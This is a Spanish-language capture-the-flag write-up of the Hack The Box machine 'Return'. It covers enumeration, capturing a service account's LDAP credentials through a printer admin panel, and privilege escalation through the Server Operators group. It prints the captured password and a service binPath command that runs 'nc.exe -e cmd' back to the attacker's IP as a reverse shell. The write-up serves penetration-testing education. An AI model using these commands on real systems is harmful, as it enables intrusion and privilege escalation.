# Return

<p align="center">
  <img src="https://www.hackthebox.com/storage/avatars/defa149ea7e259a4709a03a5825e970d.png">
</p>

<div align="center">
  <table>
    <tr>
      <th>Plataforma</th>
      <th>Nombre</th>
      <th>OS</th>
      <th>IP</th>
      <th>Fecha de la máquina retirada</th>
      <th>Dificultad</th>
      <th>Certificaciones</th>
      <th>Status</th>
    </tr>
    <tr>
      <td>Hack The Box</td>
      <td>Return</td>
      <td>Windows</td>
      <td>10.10.11.108</td>
      <td>27 de Septiembre 2021</td>
      <td>:green_circle: Fácil</td>
      <td>
        <ul>
          <li>eJPT</li>
        </ul>
      </td>
      <td>:heavy_check_mark:</td>
    </tr>
  </table>
</div>

> -------------------------

## Etapas

- [Etapa de Reconocimiento](#etapa-de-reconocimiento)
- [Etapa de Enumeración](#etapa-de-enumeración)
- [Etapa de Explotación](#etapa-de-explotación)
- [Etapa de Escalada de Privilegios](#etapa-de-escalada-de-privilegios)

> -------------------------

## Técnicas Exploradas
- Abuso de la impresora
- Abuso del grupo de operadores del servidor
- Manipulación de la configuración del servicio
 
> -------------------------

## Etapa de Reconocimiento

<p align="justify">
  Para empezar, iniciamos un escaneo agresivo para la enumeración de puerto abierto y descubrimos la siguiente información de puertos, lo cual no es recomendable, se debe aplicar escaneos sigiloso.
</p>

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
nmap -sCV -p<PORTS> <IP> -oN targeted - Formato NMAP
nmap -sCV -p<PORTS> <IP> -oX targeted - Formato XML
	xsltproc targetedXML > /var/www/html/index.html
```

|Item|Descripción|
|---|---|
|-p-|Un atajo que le dice a Nmap que escanee todos los puertos|
|-vvv|Brinda una salida muy detallada para que pueda ver los resultados a medida que se encuentran, y también incluye información que normalmente no se muestra|
|-sC|Equivale --script=default ejecuta una colección de scripts de enumeración Nmap contra el objetivo|
|-sV|¿Escanea una versión de servicio?|
|-oA|Guarda los tres formatos (estándar, greppable y XML) de salida con un nombre de archivo de $name|

```java
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-12 02:01:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
58691/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-12T02:03:03
|_  start_date: N/A
|_clock-skew: 18m19s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

<p align="justify">
  Parece ser un sistema con Windows, ya que presenta varios puertos típicos de un Controlador de Dominio, como 53, 88, 135, 139, 445, 389, entre otros. También se encuentra habilitado el puerto 5985 para WinRM, lo cual es de particular interés para mí, ya que verificaré su accesibilidad en busca de credenciales.
</p>

> -------------------------

## Etapa de Enumeración

> **SERVICIO SMB - PORT 445**

<p align="justify">
  CrackMapExec indica que el nombre del equipos es PRINTER.return.local, y para acceder a cualquier información adicional a través de SMB, se requiere autenticación.
</p>

```java
crackmapexec smb 10.10.11.108
crackmapexec smb 10.10.11.108 --shares
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/7a1069ec-3e89-461e-821c-5789798c91e7">
</p>

> **SERVICIO HTTP - PORT 80**

<p align="justify">
Luego, proceder a visitar el servidor web en el navegador, y este me presentó un panel de control relacionado con una impresora. Mientras exploraba el panel de control, noté la presencia de algunas credenciales en la página de configuración. Estuve a punto de deducir el dominio (return.local).
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/2beaee31-b28b-42e8-a1da-08653051d3e7">
</p>

### **Recolección de credenciales LDAP**

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/538e84a0-9e9f-47d3-9f10-9c9d0914c7b0">
</p>

<p align="justify">
Como la página de configuración nos permite especificar la dirección del servidor LDAP en la opción de Settings, inicié una escucha netcat en el puerto 389. A continuación, cambié la dirección IP en el formulario de dirección del servidor. Como las credenciales probablemente estaban almacenadas en caché en el host, esperaba que el host intentara autenticarse contra nuestro listener netcat.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/6e841431-022a-4459-bbd4-4bcf679abcfb">
</p>

<p align="justify">
Tras introducir mi dirección IP en el campo Server Address del formulario, mi listener netcat recibió de inmediato las credenciales de la impresora. Utilicé estas credenciales para realizar un escaneo de SMB con éxito. No obstante, durante la exploración con Nmap, observé que el puerto 5985 (Microsoft HTTPAPI) estaba activo. Esto me dio la oportunidad de establecer una conexión a través de Evil-WinRM.
</p>

```go
nc -nvlp 389
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/4d45b9b5-9959-4838-bb4c-755cdad860c1">
</p>

<p align="justify">
Ahora podemos verificar la autenticidad de las credenciales obtenidas mediante la herramienta **Crackmapexec** a través del protocolo SMB.
</p>

```go
crackmapexec smb 10.10.11.108 -u 'svc-print' -p '1edFg43012!!'
crackmapexec smb 10.10.11.108 -u 'svc-print' -p '1edFg43012!!' --shares
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/463a421b-11dc-433c-a4d1-0b0e3598a58f">
</p>

<p align="justify">
Como mencioné anteriormente, el puerto 5985 se encontraba accesible, lo que me permitió establecer una conexión mediante Evil-WinRM.
</p>

```go
crakmapexec winrm 10.10.11.108 -u 'svc-print' -p '1edFg43012!!'
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/89919f32-1c64-42d2-a0c8-8396c9e9ddf2">
</p>

<p align="justify">
  El objetivo autenticó mi acceso utilizando las credenciales que obtuvimos de la impresora.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/39c8d690-a696-4be4-b3f3-5c311a668231">
</p>

A partir de este punto, podemos adquirir la flag "**user.txt**"

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1a1913ac-3f4b-431b-9645-3693826ac32d">
</p>

> -------------------------

## Etapa de Explotación

- whoami
- whoami /groups
- whoami /priv
- net users
- net groups
- net usr svc-printer

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/87150c97-d354-49e6-b6c7-201bfa1e2e55">
</p>

<p align="justify">
  Hasta el momento, hemos recopilado una cantidad sustancial de información valiosa. Uno de los aspectos más relevantes es que hemos identificado que nuestro usuario forma parte de los grupos de Operadores del servidor. Para obtener información adicional y comprender cómo esto podría ser beneficioso, te recomiendo consultar la documentación en este enlace, donde se detallan las implicaciones de esta pertenencia.
</p>

- [Active Directory Security Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/ebfc57ee-3603-4838-91fe-50c456ee2421">
</p>

```go
C:> services
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/eddeba1d-b32e-4c1d-9357-e96747c59db1">
</p>

> -------------------------

## Etapa de Escalada de Privilegios

<p align="justify"> 
  El usuario tiene la capacidad de iniciar y detener servicios, lo que implica que puedo reconfigurar un servicio y reiniciarlo. Por esa razón, se debe subir el binario NC.EXE al servidor. Lo que hace que Evil-WinRM sea especialmente útil es su capacidad para cargar archivos. Utilizando el comando de carga, pude transferir el binario de netcat al servidor.
</p>

```go
locate nc.exe
cp $(locate nc.exe) .
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/779fbace-97ba-4d8f-905b-c3da38f4b970">
</p>

```go
PS C:> upload $PATH-NC.EXE
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/9c024858-bb81-423f-8e9c-a44138ab0beb">
</p>

<p align="justify"> 
  Una vez que el binario se encontraba en el servidor, aproveché la funcionalidad de servicios integrados de Evil-WinRM para consultar qué servicios estaban en escucha. En la imagen siguiente se muestran los servicios junto con su nivel de privilegios. Aunque identifiqué varias opciones de servicios que podrían ser objeto de abuso, decidí focalizarme en el servicio VGAuthService. Tratemos de crear un servicio.
</p>

```go
PS C:> sc.exe create reverse binPath="C:\Windows\Temp\Info\nc.exe -e cmd 10.10.14.3 443"
```

<p align="justify"> 
Posteriormente, intenté modificar la configuración de un servicio existente para que en lugar de usar su propio binario, empleara el netcat que había uno que fue modificado el BinPath del servicio.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/98925c39-1078-4eb8-b214-28181ce7d71d">
</p>

```go
PS C:> sc.exe config VMTools binPath="C:\Windows\Temp\Info\nc.exe -e cmd 10.10.14.3 443"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/3122efff-ceb1-4a21-bcef-20353506b46f">
</p>

<p align="justify"> 
Confirmamos la existencia de este servicio:
</p>

```
PS C:> services
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/a10034da-5ca9-42d1-9d46-f9905603b142">
</p>

<p align="justify"> 
Antes de detener e iniciar el servicio, deberemos configurar netcat para escuchar en el puerto especificado:
</p>

```go
rlwrap nc -nvlp 443
```

<p align="justify"> 
Ahora una vez que el servicio se inicie, obtendremos una shell en netcat.
</p>

```powershell
PS C:> sc.exe stop VMTools
PS C:> sc.exe start VMTools
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/5af0a15f-6952-44ca-9031-4a91ff00038a">
</p>

<p align="justify"> 
Para finalizar solo necesitamos encontrar nuestra flag de root. Es importante destacar que debemos realizar las acciones con rapidez, ya que el servicio se detendrá después de cierto tiempo y tendremos que reiniciar netcat junto con el servicio.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/9f325a18-63cb-4960-b5b7-b98be7ae2112">
</p>

> **RETURN - PWNED!**
